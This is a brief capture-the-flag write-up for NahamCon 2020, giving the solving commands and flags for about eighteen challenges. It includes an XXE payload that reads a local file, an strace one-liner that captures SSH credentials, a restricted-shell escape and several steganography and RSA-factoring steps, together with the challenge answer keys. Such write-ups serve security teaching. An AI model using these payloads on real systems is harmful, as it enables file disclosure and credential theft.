# NahamCon 2020

## SSH Logger

```
strace -ff -p 1 -e read |& fgrep ', "\f\0\0'
[pid 24672] read(6, "\f\0\0\0\33flag{okay_so_that_was_cool}", 32) = 32
flag{okay_so_that_was_cool}
```

## Vortex

```
nc jh2i.com 50017 > out
strings out | grep flag
flag{more_text_in_the_vortex}
```

## Raspberry

```
n = 7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317
e = 65537
c = 5300731709583714451062905238531972160518525080858095184581839366680022995297863013911612079520115435945472004626222058696229239285358638047675780769773922795279074074633888720787195549544835291528116093909456225670152733191556650639553906195856979794273349598903501654956482056938935258794217285615471681
```

[http://factordb.com/index.php?query=7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317](http://factordb.com/index.php?query=7735208939848985079680614633581782274371148157293352904905313315409418467322726702848189532721490121708517697848255948254656192793679424796954743649810878292688507385952920229483776389922650388739975072587660866986603080986980359219525111589659191172937047869008331982383695605801970189336227832715706317
)

```
[2208664111, 2214452749, 2259012491, 2265830453, 2372942981, 2393757139, 2465499073, 2508863309, 2543358889, 2589229021, 2642723827, 2758626487, 2850808189, 2947867051, 2982067987, 3130932919, 3290718047, 3510442297, 3600488797, 3644712913, 3650456981, 3726115171, 3750978137, 3789130951, 3810149963, 3979951739, 4033877203, 4128271747, 4162800959, 4205130337, 4221911101, 4268160257]
flag{there_are_a_few_extra_berries_in_this_one}
```

## Ooo-la-la

[https://www.alpertron.com.ar/ECM.HTM](https://www.alpertron.com.ar/ECM.HTM)

```
1 830213 987675 567884 451892 843232 991595 746198 390911 664175 679946 063194 531096 037459 873211 879206 428207 (97 digits) × 1 830213 987675 567884 451892 843232 991595 746198 390911 664175 679946 063194 531096 037459 873211 879206 428213 
1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428207
1830213987675567884451892843232991595746198390911664175679946063194531096037459873211879206428213
flag{ooo_la_la_those_are_sexy_primes}
```

## Alkatraz

```
compgen -c
source flag.txt
flag.txt: line 1: flag{congrats_you_just_escaped_alkatraz}: command not found
```

## Extraterrestrial

[https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/](https://bookgin.tw/2018/12/04/from-xxe-to-rce-pwn2win-ctf-2018-writeup/)

xml injection

```
<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///flag.txt">]>                                                             
<message>
<id></id>
<message>&xxe;</message>
<title>xml</title>
</message>
array(1) {
  ["xxe"]=>
  string(38) "flag{extraterrestrial_extra_entities}"
}
```

## NahamConTron

[https://www.instagram.com/NahamConTron/](https://www.instagram.com/NahamConTron/
)
```
flag{i_feel_like_that_was_too_easy}
```

## December

[https://blog.kimtae.xyz/151](https://blog.kimtae.xyz/151)

```
flag{this_is_all_i_need}
```

## Unvreakable Vase

```
ZmxhZ3tkb2VzX3RoaXNfZXZlbl9jb3VudF9hc19jcnlwdG9vb30=
flag{does_this_even_count_as_cryptooo}
```

## Time Keeper

[https://web.archive.org/web/20200418214642/https://apporima.com/]([https://web.archive.org/web/20200418214642/https://apporima.com/])

## New Years Resolution

[https://github.com/domainaware/checkdmarc](https://github.com/domainaware/checkdmarc)

```
ctf osint "nameserver"
flag{next_year_i_wont_use_spf}
```

## Beep Boop

[http://dialabc.com/sound/detect/index.html](http://dialabc.com/sound/detect/index.html)
[https://github.com/ribt/dtmf-decoder?files=1](https://github.com/ribt/dtmf-decoder?files=1)

```
python3 dtmf.py flag.wav -t 22
l2b(46327402297754110981468069185383422945309689772058551073955248013949155635325)
'flag{do_you_speak_the_beep_boop}'
```

## My Apologies

[https://ctf.themanyhats.club/write-up-hyperion-gray-steganography-challenge/](https://ctf.themanyhats.club/write-up-hyperion-gray-steganography-challenge/)
[http://zderadicka.eu/hiding-secret-message-in-unicode-text/](http://zderadicka.eu/hiding-secret-message-in-unicode-text/)
[https://holloway.nz/steg/](https://holloway.nz/steg/)

```
flag_i_am_so_sorry_steg_sucks   
```

## Dead Swap

[https://bpsecblog.wordpress.com/2016/08/21/amalmot_4/](https://bpsecblog.wordpress.com/2016/08/21/amalmot_4/)

```
flag{what_are_you_doing_in_my_swap}
0x4ffee9
```

## Doh

[https://github.com/bannsec/stegoVeritas](https://github.com/bannsec/stegoVeritas)
[https://pentesttools.net/stego-toolkit-collection-of-steganography-tools-helps-with-ctf-challenges/](https://pentesttools.net/stego-toolkit-collection-of-steganography-tools-helps-with-ctf-challenges/)

```
JCTF{an_annoyed_grunt}
```

## Old School

```
zsteg -a hackers.bmp
b1,bgr,lsb,xy       .. text: "4JCTF{at_least_the_movie_is_older_than_this_software}"
```